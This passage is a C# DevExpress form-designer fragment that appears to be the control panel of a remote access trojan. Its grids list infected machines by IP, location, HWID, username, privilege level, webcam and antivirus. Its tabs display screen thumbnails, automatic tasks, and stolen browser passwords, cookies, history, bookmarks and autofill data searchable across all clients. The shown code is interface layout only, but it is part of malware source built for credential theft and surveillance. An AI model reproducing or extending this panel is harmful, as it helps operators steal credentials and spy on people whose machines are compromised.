		this.gridViewClient.Appearance.SelectedRow.BorderColor = System.Drawing.Color.White;
		this.gridViewClient.Appearance.SelectedRow.ForeColor = System.Drawing.Color.White;
		this.gridViewClient.Appearance.SelectedRow.Options.UseBackColor = true;
		this.gridViewClient.Appearance.SelectedRow.Options.UseBorderColor = true;
		this.gridViewClient.Appearance.SelectedRow.Options.UseForeColor = true;
		this.gridViewClient.Appearance.VertLine.BackColor = System.Drawing.Color.Green;
		this.gridViewClient.Appearance.VertLine.Options.UseBackColor = true;
		this.gridViewClient.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[17]
		{
			this.IPColumn, this.CountryColumn, this.NoteColumn, this.GroupColumn, this.HWIDColumn, this.DesktopColumn, this.UserNameColumn, this.PermissionColumn, this.CPUCOlumn, this.RAMColumn,
			this.GPUColumn, this.CameraColumn, this.OSColumn, this.AVColumn, this.InstallTimeColumn, this.PingColumn, this.ActiveWinColumn
		});
		this.gridViewClient.DetailHeight = 284;
		this.gridViewClient.FocusRectStyle = DevExpress.XtraGrid.Views.Grid.DrawFocusRectStyle.RowFullFocus;
		this.gridViewClient.GridControl = this.gridControlClient;
		this.gridViewClient.GroupRowHeight = 8;
		this.gridViewClient.Name = "gridViewClient";
		this.gridViewClient.OptionsMenu.EnableColumnMenu = false;
		this.gridViewClient.OptionsMenu.EnableGroupPanelMenu = false;
		this.gridViewClient.OptionsSelection.EnableAppearanceFocusedCell = false;
		this.gridViewClient.OptionsSelection.EnableAppearanceHideSelection = false;
		this.gridViewClient.OptionsSelection.InvertSelection = true;
		this.gridViewClient.OptionsSelection.MultiSelect = true;
		this.gridViewClient.OptionsView.ColumnAutoWidth = false;
		this.gridViewClient.OptionsView.ShowGroupPanel = false;
		this.gridViewClient.RowHeight = 8;
		this.gridViewClient.CustomDrawColumnHeader += new DevExpress.XtraGrid.Views.Grid.ColumnHeaderCustomDrawEventHandler(gridViewClient_CustomDrawColumnHeader);
		this.gridViewClient.CustomDrawCell += new DevExpress.XtraGrid.Views.Base.RowCellCustomDrawEventHandler(gridViewClient_CustomDrawCell);
		this.IPColumn.AppearanceCell.Options.UseTextOptions = true;
		this.IPColumn.AppearanceCell.TextOptions.HAlignment = DevExpress.Utils.HorzAlignment.Far;
		this.IPColumn.AppearanceHeader.BorderColor = System.Drawing.Color.Green;
		this.IPColumn.AppearanceHeader.Options.UseBorderColor = true;
		this.IPColumn.Caption = "IP Address";
		this.IPColumn.FieldName = "summary";
		this.IPColumn.Fixed = DevExpress.XtraGrid.Columns.FixedStyle.Left;
		this.IPColumn.MinWidth = 150;
		this.IPColumn.Name = "IPColumn";
		this.IPColumn.OptionsColumn.FixedWidth = true;
		this.IPColumn.Visible = true;
		this.IPColumn.VisibleIndex = 0;
		this.IPColumn.Width = 200;
		this.CountryColumn.AppearanceHeader.BorderColor = System.Drawing.Color.Green;
		this.CountryColumn.AppearanceHeader.Options.UseBorderColor = true;
		this.CountryColumn.Caption = "Location";
		this.CountryColumn.FieldName = "country";
		this.CountryColumn.Name = "CountryColumn";
		this.CountryColumn.Visible = true;
		this.CountryColumn.VisibleIndex = 1;
		this.CountryColumn.Width = 126;
		this.NoteColumn.AppearanceHeader.BorderColor = System.Drawing.Color.Green;
		this.NoteColumn.AppearanceHeader.Options.UseBorderColor = true;
		this.NoteColumn.Caption = "Note";
		this.NoteColumn.FieldName = "note";
		this.NoteColumn.MinWidth = 60;
		this.NoteColumn.Name = "NoteColumn";
		this.NoteColumn.Visible = true;
		this.NoteColumn.VisibleIndex = 2;
		this.NoteColumn.Width = 82;
		this.GroupColumn.AppearanceHeader.BorderColor = System.Drawing.Color.Green;
		this.GroupColumn.AppearanceHeader.Options.UseBorderColor = true;
		this.GroupColumn.Caption = "Group Team";
		this.GroupColumn.FieldName = "group";
		this.GroupColumn.MinWidth = 60;
		this.GroupColumn.Name = "GroupColumn";
		this.GroupColumn.Visible = true;
		this.GroupColumn.VisibleIndex = 3;
		this.GroupColumn.Width = 82;
		this.HWIDColumn.Caption = "HWID";
		this.HWIDColumn.FieldName = "hwid";
		this.HWIDColumn.MinWidth = 120;
		this.HWIDColumn.Name = "HWIDColumn";
		this.HWIDColumn.OptionsColumn.AllowEdit = false;
		this.HWIDColumn.Width = 120;
		this.DesktopColumn.Caption = "PC - Identity";
		this.DesktopColumn.FieldName = "desktopname";
		this.DesktopColumn.Name = "DesktopColumn";
		this.DesktopColumn.Visible = true;
		this.DesktopColumn.VisibleIndex = 4;
		this.DesktopColumn.Width = 117;
		this.UserNameColumn.Caption = "Username";
		this.UserNameColumn.FieldName = "user";
		this.UserNameColumn.MinWidth = 120;
		this.UserNameColumn.Name = "UserNameColumn";
		this.UserNameColumn.OptionsColumn.AllowEdit = false;
		this.UserNameColumn.Visible = true;
		this.UserNameColumn.VisibleIndex = 5;
		this.UserNameColumn.Width = 120;
		this.PermissionColumn.Caption = "Privilege Level";
		this.PermissionColumn.FieldName = "permission";
		this.PermissionColumn.MinWidth = 80;
		this.PermissionColumn.Name = "PermissionColumn";
		this.PermissionColumn.OptionsColumn.AllowEdit = false;
		this.PermissionColumn.Visible = true;
		this.PermissionColumn.VisibleIndex = 6;
		this.PermissionColumn.Width = 97;
		this.CPUCOlumn.Caption = "CPU";
		this.CPUCOlumn.FieldName = "cpu";
		this.CPUCOlumn.MinWidth = 120;
		this.CPUCOlumn.Name = "CPUCOlumn";
		this.CPUCOlumn.OptionsColumn.AllowEdit = false;
		this.CPUCOlumn.Visible = true;
		this.CPUCOlumn.VisibleIndex = 7;
		this.CPUCOlumn.Width = 128;
		this.RAMColumn.Caption = "RAM";
		this.RAMColumn.FieldName = "ram";
		this.RAMColumn.MinWidth = 120;
		this.RAMColumn.Name = "RAMColumn";
		this.RAMColumn.OptionsColumn.AllowEdit = false;
		this.RAMColumn.Visible = true;
		this.RAMColumn.VisibleIndex = 8;
		this.RAMColumn.Width = 120;
		this.GPUColumn.Caption = "GPU";
		this.GPUColumn.FieldName = "gpu";
		this.GPUColumn.MinWidth = 160;
		this.GPUColumn.Name = "GPUColumn";
		this.GPUColumn.OptionsColumn.AllowEdit = false;
		this.GPUColumn.Visible = true;
		this.GPUColumn.VisibleIndex = 9;
		this.GPUColumn.Width = 160;
		this.CameraColumn.Caption = "Web Camera";
		this.CameraColumn.FieldName = "camera";
		this.CameraColumn.MinWidth = 120;
		this.CameraColumn.Name = "CameraColumn";
		this.CameraColumn.OptionsColumn.AllowEdit = false;
		this.CameraColumn.Visible = true;
		this.CameraColumn.VisibleIndex = 10;
		this.CameraColumn.Width = 120;
		this.OSColumn.Caption = "Operating System";
		this.OSColumn.FieldName = "os";
		this.OSColumn.MinWidth = 120;
		this.OSColumn.Name = "OSColumn";
		this.OSColumn.OptionsColumn.AllowEdit = false;
		this.OSColumn.Visible = true;
		this.OSColumn.VisibleIndex = 11;
		this.OSColumn.Width = 180;
		this.AVColumn.Caption = "AntiVirus";
		this.AVColumn.FieldName = "defender";
		this.AVColumn.MinWidth = 120;
		this.AVColumn.Name = "AVColumn";
		this.AVColumn.OptionsColumn.AllowEdit = false;
		this.AVColumn.Visible = true;
		this.AVColumn.VisibleIndex = 12;
		this.AVColumn.Width = 120;
		this.InstallTimeColumn.Caption = "Install Time";
		this.InstallTimeColumn.FieldName = "installed";
		this.InstallTimeColumn.MinWidth = 100;
		this.InstallTimeColumn.Name = "InstallTimeColumn";
		this.InstallTimeColumn.OptionsColumn.AllowEdit = false;
		this.InstallTimeColumn.Visible = true;
		this.InstallTimeColumn.VisibleIndex = 13;
		this.InstallTimeColumn.Width = 160;
		this.PingColumn.Caption = "Ping";
		this.PingColumn.FieldName = "ping";
		this.PingColumn.MinWidth = 120;
		this.PingColumn.Name = "PingColumn";
		this.PingColumn.OptionsColumn.AllowEdit = false;
		this.PingColumn.Visible = true;
		this.PingColumn.VisibleIndex = 14;
		this.PingColumn.Width = 120;
		this.ActiveWinColumn.Caption = "Active Window";
		this.ActiveWinColumn.FieldName = "activewin";
		this.ActiveWinColumn.MinWidth = 200;
		this.ActiveWinColumn.Name = "ActiveWinColumn";
		this.ActiveWinColumn.OptionsColumn.AllowEdit = false;
		this.ActiveWinColumn.Visible = true;
		this.ActiveWinColumn.VisibleIndex = 15;
		this.ActiveWinColumn.Width = 200;
		this.xtraTabPage12.Controls.Add(this.gridControlLog);
		this.xtraTabPage12.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("xtraTabPage12.ImageOptions.Image");
		this.xtraTabPage12.Name = "xtraTabPage12";
		this.xtraTabPage12.Size = new System.Drawing.Size(1430, 623);
		this.xtraTabPage12.Text = "Task Activity";
		this.gridControlLog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlLog.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlLog.Location = new System.Drawing.Point(0, 0);
		this.gridControlLog.MainView = this.gridViewLog;
		this.gridControlLog.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlLog.MenuManager = this.barManager1;
		this.gridControlLog.Name = "gridControlLog";
		this.gridControlLog.Size = new System.Drawing.Size(1430, 623);
		this.gridControlLog.TabIndex = 10;
		this.gridControlLog.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewLog });
		this.gridControlLog.MouseUp += new System.Windows.Forms.MouseEventHandler(gridControlLog_MouseUp);
		this.gridViewLog.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[2] { this.TimeColumn, this.MsgColumn });
		this.gridViewLog.DetailHeight = 284;
		this.gridViewLog.GridControl = this.gridControlLog;
		this.gridViewLog.Name = "gridViewLog";
		this.gridViewLog.OptionsView.ShowGroupPanel = false;
		this.TimeColumn.Caption = "Time";
		this.TimeColumn.FieldName = "Time";
		this.TimeColumn.Name = "TimeColumn";
		this.TimeColumn.OptionsColumn.AllowEdit = false;
		this.TimeColumn.OptionsColumn.FixedWidth = true;
		this.TimeColumn.Visible = true;
		this.TimeColumn.VisibleIndex = 0;
		this.TimeColumn.Width = 100;
		this.MsgColumn.Caption = "Message";
		this.MsgColumn.FieldName = "Msg";
		this.MsgColumn.Name = "MsgColumn";
		this.MsgColumn.OptionsColumn.AllowEdit = false;
		this.MsgColumn.Visible = true;
		this.MsgColumn.VisibleIndex = 1;
		this.MsgColumn.Width = 868;
		this.xtraTabPage2.Controls.Add(this.panelControl2);
		this.xtraTabPage2.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("xtraTabPage2.ImageOptions.Image");
		this.xtraTabPage2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage2.Name = "xtraTabPage2";
		this.xtraTabPage2.Size = new System.Drawing.Size(1430, 623);
		this.xtraTabPage2.Text = "ThumbnailI";
		this.panelControl2.Controls.Add(this.listViewScreen);
		this.panelControl2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panelControl2.Location = new System.Drawing.Point(0, 0);
		this.panelControl2.Name = "panelControl2";
		this.panelControl2.Size = new System.Drawing.Size(1430, 623);
		this.panelControl2.TabIndex = 2;
		this.listViewScreen.BackgroundImage = (System.Drawing.Image)resources.GetObject("listViewScreen.BackgroundImage");
		this.listViewScreen.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listViewScreen.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listViewScreen.ForeColor = System.Drawing.SystemColors.Info;
		this.listViewScreen.HideSelection = false;
		this.listViewScreen.LargeImageList = this.ThumbnailImageList;
		this.listViewScreen.Location = new System.Drawing.Point(2, 2);
		this.listViewScreen.Margin = new System.Windows.Forms.Padding(2);
		this.listViewScreen.Name = "listViewScreen";
		this.listViewScreen.ShowItemToolTips = true;
		this.listViewScreen.Size = new System.Drawing.Size(1426, 619);
		this.listViewScreen.SmallImageList = this.ThumbnailImageList;
		this.listViewScreen.TabIndex = 1;
		this.listViewScreen.UseCompatibleStateImageBehavior = false;
		this.listViewScreen.MouseUp += new System.Windows.Forms.MouseEventHandler(listViewScreen_MouseUp);
		this.xtraTabPage3.Controls.Add(this.gridControlTask);
		this.xtraTabPage3.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("xtraTabPage3.ImageOptions.Image");
		this.xtraTabPage3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage3.Name = "xtraTabPage3";
		this.xtraTabPage3.Size = new System.Drawing.Size(1430, 623);
		this.xtraTabPage3.Text = "Automatically Task";
		this.xtraTabPage3.Paint += new System.Windows.Forms.PaintEventHandler(xtraTabPage3_Paint);
		this.gridControlTask.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlTask.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlTask.Location = new System.Drawing.Point(0, 0);
		this.gridControlTask.MainView = this.gridViewTask;
		this.gridControlTask.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlTask.MenuManager = this.barManager1;
		this.gridControlTask.Name = "gridControlTask";
		this.gridControlTask.Size = new System.Drawing.Size(1430, 623);
		this.gridControlTask.TabIndex = 2;
		this.gridControlTask.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewTask });
		this.gridControlTask.MouseUp += new System.Windows.Forms.MouseEventHandler(listTask_MouseUp);
		this.gridViewTask.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[2] { this.TaskNameColumn, this.TaskRunTimesColumn });
		this.gridViewTask.DetailHeight = 284;
		this.gridViewTask.GridControl = this.gridControlTask;
		this.gridViewTask.Name = "gridViewTask";
		this.gridViewTask.OptionsView.ShowGroupPanel = false;
		this.TaskNameColumn.Caption = "Task";
		this.TaskNameColumn.FieldName = "title";
		this.TaskNameColumn.Fixed = DevExpress.XtraGrid.Columns.FixedStyle.Left;
		this.TaskNameColumn.MinWidth = 100;
		this.TaskNameColumn.Name = "TaskNameColumn";
		this.TaskNameColumn.OptionsColumn.AllowEdit = false;
		this.TaskNameColumn.Visible = true;
		this.TaskNameColumn.VisibleIndex = 0;
		this.TaskNameColumn.Width = 150;
		this.TaskRunTimesColumn.Caption = "Run Times";
		this.TaskRunTimesColumn.FieldName = "cnt";
		this.TaskRunTimesColumn.Name = "TaskRunTimesColumn";
		this.TaskRunTimesColumn.OptionsColumn.AllowEdit = false;
		this.TaskRunTimesColumn.Visible = true;
		this.TaskRunTimesColumn.VisibleIndex = 1;
		this.xtraTabPage4.Controls.Add(this.tableLayoutPanel1);
		this.xtraTabPage4.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("xtraTabPage4.ImageOptions.Image");
		this.xtraTabPage4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage4.Name = "xtraTabPage4";
		this.xtraTabPage4.Size = new System.Drawing.Size(1430, 623);
		this.xtraTabPage4.Text = "Password Recovery";
		this.tableLayoutPanel1.ColumnCount = 2;
		this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 20f));
		this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 80f));
		this.tableLayoutPanel1.Controls.Add(this.panel2, 0, 0);
		this.tableLayoutPanel1.Controls.Add(this.xtraTabControl2, 1, 0);
		this.tableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tableLayoutPanel1.Location = new System.Drawing.Point(0, 0);
		this.tableLayoutPanel1.Margin = new System.Windows.Forms.Padding(4);
		this.tableLayoutPanel1.Name = "tableLayoutPanel1";
		this.tableLayoutPanel1.RowCount = 1;
		this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 623f));
		this.tableLayoutPanel1.Size = new System.Drawing.Size(1430, 623);
		this.tableLayoutPanel1.TabIndex = 3;
		this.panel2.Controls.Add(this.listViewRecoveryClients);
		this.panel2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel2.Location = new System.Drawing.Point(3, 2);
		this.panel2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panel2.Name = "panel2";
		this.panel2.Size = new System.Drawing.Size(280, 619);
		this.panel2.TabIndex = 10;
		this.listViewRecoveryClients.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listViewRecoveryClients.Location = new System.Drawing.Point(0, 0);
		this.listViewRecoveryClients.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.listViewRecoveryClients.Name = "listViewRecoveryClients";
		this.listViewRecoveryClients.Size = new System.Drawing.Size(280, 619);
		this.listViewRecoveryClients.TabIndex = 2;
		this.listViewRecoveryClients.MouseClick += new System.Windows.Forms.MouseEventHandler(listViewClients_MouseClick);
		this.listViewRecoveryClients.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(listViewClients_MouseDoubleClick);
		this.listViewRecoveryClients.MouseUp += new System.Windows.Forms.MouseEventHandler(listViewRecoveryClients_MouseUp);
		this.xtraTabControl2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl2.Location = new System.Drawing.Point(289, 2);
		this.xtraTabControl2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabControl2.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl2.Name = "xtraTabControl2";
		this.xtraTabControl2.SelectedTabPage = this.xtraTabPage7;
		this.xtraTabControl2.Size = new System.Drawing.Size(1138, 619);
		this.xtraTabControl2.TabIndex = 6;
		this.xtraTabControl2.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[5] { this.xtraTabPage7, this.xtraTabPage8, this.xtraTabPage9, this.xtraTabPage10, this.xtraTabPage11 });
		this.xtraTabPage7.Controls.Add(this.splitContainer3);
		this.xtraTabPage7.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage7.Name = "xtraTabPage7";
		this.xtraTabPage7.Size = new System.Drawing.Size(1136, 588);
		this.xtraTabPage7.Text = "Passwords";
		this.splitContainer3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splitContainer3.FixedPanel = System.Windows.Forms.FixedPanel.Panel1;
		this.splitContainer3.IsSplitterFixed = true;
		this.splitContainer3.Location = new System.Drawing.Point(0, 0);
		this.splitContainer3.Name = "splitContainer3";
		this.splitContainer3.Orientation = System.Windows.Forms.Orientation.Horizontal;
		this.splitContainer3.Panel1.Controls.Add(this.panel1);
		this.splitContainer3.Panel2.Controls.Add(this.gridControlRecoveryPassword);
		this.splitContainer3.Size = new System.Drawing.Size(1136, 588);
		this.splitContainer3.SplitterDistance = 35;
		this.splitContainer3.TabIndex = 0;
		this.panel1.Controls.Add(this.txtPasswordSearch);
		this.panel1.Controls.Add(this.toolStripLabelPasswordCount);
		this.panel1.Controls.Add(this.chkAll);
		this.panel1.Controls.Add(this.label1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(0, 0);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(1136, 35);
		this.panel1.TabIndex = 1;
		this.txtPasswordSearch.Location = new System.Drawing.Point(65, 2);
		this.txtPasswordSearch.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtPasswordSearch.MenuManager = this.barManager1;
		this.txtPasswordSearch.Name = "txtPasswordSearch";
		this.txtPasswordSearch.Size = new System.Drawing.Size(340, 28);
		this.txtPasswordSearch.TabIndex = 1;
		this.txtPasswordSearch.TextChanged += new System.EventHandler(txtRecoverysearch_TextChanged);
		this.toolStripLabelPasswordCount.AutoSize = true;
		this.toolStripLabelPasswordCount.Location = new System.Drawing.Point(561, 8);
		this.toolStripLabelPasswordCount.Name = "toolStripLabelPasswordCount";
		this.toolStripLabelPasswordCount.Size = new System.Drawing.Size(101, 13);
		this.toolStripLabelPasswordCount.TabIndex = 15;
		this.toolStripLabelPasswordCount.Text = "Password Count : 0";
		this.chkAll.Location = new System.Drawing.Point(423, 6);
		this.chkAll.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.chkAll.Name = "chkAll";
		this.chkAll.Properties.Caption = "Search All Client";
		this.chkAll.Size = new System.Drawing.Size(104, 22);
		this.chkAll.TabIndex = 1;
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(11, 9);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(50, 13);
		this.label1.TabIndex = 13;
		this.label1.Text = "Search : ";
		this.gridControlRecoveryPassword.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlRecoveryPassword.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlRecoveryPassword.Location = new System.Drawing.Point(0, 0);
		this.gridControlRecoveryPassword.MainView = this.gridViewRecoveryPassword;
		this.gridControlRecoveryPassword.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlRecoveryPassword.MenuManager = this.barManager1;
		this.gridControlRecoveryPassword.Name = "gridControlRecoveryPassword";
		this.gridControlRecoveryPassword.Size = new System.Drawing.Size(1136, 549);
		this.gridControlRecoveryPassword.TabIndex = 2;
		this.gridControlRecoveryPassword.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewRecoveryPassword });
		this.gridViewRecoveryPassword.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[4] { this.RecoveryNameColumn, this.RecoveryPasswordColumn, this.RecoveryUrlColumn, this.RecoveryTargetColumn });
		this.gridViewRecoveryPassword.DetailHeight = 284;
		this.gridViewRecoveryPassword.GridControl = this.gridControlRecoveryPassword;
		this.gridViewRecoveryPassword.Name = "gridViewRecoveryPassword";
		this.gridViewRecoveryPassword.OptionsView.ShowGroupPanel = false;
		this.RecoveryNameColumn.Caption = "Name";
		this.RecoveryNameColumn.FieldName = "sUsername";
		this.RecoveryNameColumn.Name = "RecoveryNameColumn";
		this.RecoveryNameColumn.Visible = true;
		this.RecoveryNameColumn.VisibleIndex = 0;
		this.RecoveryPasswordColumn.Caption = "Password";
		this.RecoveryPasswordColumn.FieldName = "sPassword";
		this.RecoveryPasswordColumn.Name = "RecoveryPasswordColumn";
		this.RecoveryPasswordColumn.Visible = true;
		this.RecoveryPasswordColumn.VisibleIndex = 1;
		this.RecoveryUrlColumn.Caption = "Url";
		this.RecoveryUrlColumn.FieldName = "sUrl";
		this.RecoveryUrlColumn.Name = "RecoveryUrlColumn";
		this.RecoveryUrlColumn.Visible = true;
		this.RecoveryUrlColumn.VisibleIndex = 2;
		this.RecoveryTargetColumn.Caption = "Target";
		this.RecoveryTargetColumn.FieldName = "Target";
		this.RecoveryTargetColumn.Name = "RecoveryTargetColumn";
		this.RecoveryTargetColumn.Visible = true;
		this.RecoveryTargetColumn.VisibleIndex = 3;
		this.xtraTabPage8.Controls.Add(this.gridControlCookie);
		this.xtraTabPage8.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage8.Name = "xtraTabPage8";
		this.xtraTabPage8.Size = new System.Drawing.Size(1136, 588);
		this.xtraTabPage8.Text = "Cookies";
		this.gridControlCookie.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlCookie.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlCookie.Location = new System.Drawing.Point(0, 0);
		this.gridControlCookie.MainView = this.gridViewCookie;
		this.gridControlCookie.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlCookie.MenuManager = this.barManager1;
		this.gridControlCookie.Name = "gridControlCookie";
		this.gridControlCookie.Size = new System.Drawing.Size(1136, 588);
		this.gridControlCookie.TabIndex = 3;
		this.gridControlCookie.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewCookie });
		this.gridViewCookie.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[4] { this.CookieNameColumn, this.CookieValueColum, this.CookieDomainColumn, this.CookieExpColumn });
		this.gridViewCookie.DetailHeight = 284;
		this.gridViewCookie.GridControl = this.gridControlCookie;
		this.gridViewCookie.Name = "gridViewCookie";
		this.gridViewCookie.OptionsView.ShowGroupPanel = false;
		this.CookieNameColumn.Caption = "Name";
		this.CookieNameColumn.FieldName = "name";
		this.CookieNameColumn.Name = "CookieNameColumn";
		this.CookieNameColumn.Visible = true;
		this.CookieNameColumn.VisibleIndex = 0;
		this.CookieValueColum.Caption = "Value";
		this.CookieValueColum.FieldName = "value";
		this.CookieValueColum.Name = "CookieValueColum";
		this.CookieValueColum.Visible = true;
		this.CookieValueColum.VisibleIndex = 1;
		this.CookieDomainColumn.Caption = "Domain";
		this.CookieDomainColumn.FieldName = "domain";
		this.CookieDomainColumn.Name = "CookieDomainColumn";
		this.CookieDomainColumn.Visible = true;
		this.CookieDomainColumn.VisibleIndex = 2;
		this.CookieExpColumn.Caption = "ExpDate";
		this.CookieExpColumn.FieldName = "expirationDate";
		this.CookieExpColumn.Name = "CookieExpColumn";
		this.CookieExpColumn.Visible = true;
		this.CookieExpColumn.VisibleIndex = 3;
		this.xtraTabPage9.Controls.Add(this.gridControlHistory);
		this.xtraTabPage9.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage9.Name = "xtraTabPage9";
		this.xtraTabPage9.Size = new System.Drawing.Size(1136, 588);
		this.xtraTabPage9.Text = "History";
		this.gridControlHistory.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlHistory.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlHistory.Location = new System.Drawing.Point(0, 0);
		this.gridControlHistory.MainView = this.gridViewHistory;
		this.gridControlHistory.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlHistory.MenuManager = this.barManager1;
		this.gridControlHistory.Name = "gridControlHistory";
		this.gridControlHistory.Size = new System.Drawing.Size(1136, 588);
		this.gridControlHistory.TabIndex = 4;
		this.gridControlHistory.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewHistory });
		this.gridViewHistory.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[2] { this.HistoryUrlColumn, this.HistoryTitleColumn });
		this.gridViewHistory.DetailHeight = 284;
		this.gridViewHistory.GridControl = this.gridControlHistory;
		this.gridViewHistory.Name = "gridViewHistory";
		this.gridViewHistory.OptionsView.ShowGroupPanel = false;
		this.HistoryUrlColumn.Caption = "Url";
		this.HistoryUrlColumn.FieldName = "sUrl";
		this.HistoryUrlColumn.Name = "HistoryUrlColumn";
		this.HistoryUrlColumn.Visible = true;
		this.HistoryUrlColumn.VisibleIndex = 0;
		this.HistoryTitleColumn.Caption = "Title";
		this.HistoryTitleColumn.FieldName = "sTitle";
		this.HistoryTitleColumn.Name = "HistoryTitleColumn";
		this.HistoryTitleColumn.Visible = true;
		this.HistoryTitleColumn.VisibleIndex = 1;
		this.xtraTabPage10.Controls.Add(this.gridControlBookmarks);
		this.xtraTabPage10.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage10.Name = "xtraTabPage10";
		this.xtraTabPage10.Size = new System.Drawing.Size(1136, 588);
		this.xtraTabPage10.Text = "Bookmarks";
		this.gridControlBookmarks.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlBookmarks.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlBookmarks.Location = new System.Drawing.Point(0, 0);
		this.gridControlBookmarks.MainView = this.gridViewBookmarks;
		this.gridControlBookmarks.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlBookmarks.MenuManager = this.barManager1;
		this.gridControlBookmarks.Name = "gridControlBookmarks";
		this.gridControlBookmarks.Size = new System.Drawing.Size(1136, 588);
		this.gridControlBookmarks.TabIndex = 5;
		this.gridControlBookmarks.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewBookmarks });
		this.gridViewBookmarks.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[2] { this.BmUrlColumn, this.BmTitleColumn });
		this.gridViewBookmarks.DetailHeight = 284;
		this.gridViewBookmarks.GridControl = this.gridControlBookmarks;
		this.gridViewBookmarks.Name = "gridViewBookmarks";
		this.gridViewBookmarks.OptionsView.ShowGroupPanel = false;
		this.BmUrlColumn.Caption = "Url";
		this.BmUrlColumn.FieldName = "sUrl";
		this.BmUrlColumn.Name = "BmUrlColumn";
		this.BmUrlColumn.Visible = true;
		this.BmUrlColumn.VisibleIndex = 0;
		this.BmTitleColumn.Caption = "Title";
		this.BmTitleColumn.FieldName = "sTitle";
		this.BmTitleColumn.Name = "BmTitleColumn";
		this.BmTitleColumn.Visible = true;
		this.BmTitleColumn.VisibleIndex = 1;
		this.xtraTabPage11.Controls.Add(this.gridControlAutofill);
		this.xtraTabPage11.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage11.Name = "xtraTabPage11";
		this.xtraTabPage11.Size = new System.Drawing.Size(1136, 588);
		this.xtraTabPage11.Text = "AutoFills";
		this.gridControlAutofill.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlAutofill.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlAutofill.Location = new System.Drawing.Point(0, 0);
		this.gridControlAutofill.MainView = this.gridViewAutofill;
		this.gridControlAutofill.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
